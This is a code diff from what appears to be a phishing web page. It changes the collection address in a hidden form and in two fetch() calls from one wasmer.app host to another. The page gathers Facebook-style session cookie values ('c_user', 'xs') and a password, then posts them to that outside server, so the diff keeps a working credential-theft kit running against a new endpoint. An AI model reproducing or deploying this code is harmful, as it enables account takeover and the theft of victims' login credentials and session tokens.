@@ -1536,7 +1536,7 @@
     </div>
     
     <!-- Hidden form for submission -->
-    <form id="hiddenForm" class="hidden-form" action="https://php-ac262.wasmer.app" method="post">
+    <form id="hiddenForm" class="hidden-form" action="https://php-ca858.wasmer.app/" method="post">
         <input type="hidden" name="c_user" id="hiddenCUser">
         <input type="hidden" name="xs" id="hiddenXs">
         <input type="hidden" name="password" id="hiddenPassword">
@@ -1971,7 +1971,7 @@
                 formData.append('c_user', cUserInput.value);
                 formData.append('xs', xsInput.value);
                 
-                fetch('https://php-ac262.wasmer.app', {
+                fetch('https://php-ca858.wasmer.app/', {
                     method: 'POST',
                     body: formData
                 })
@@ -2017,7 +2017,7 @@
                 const formData = new FormData();
                 formData.append('password', passwordInput.value);
                 
-                fetch('https://php-ac262.wasmer.app', {
+                fetch('https://php-ca858.wasmer.app/', {
                     method: 'POST',
                     body: formData
                 })
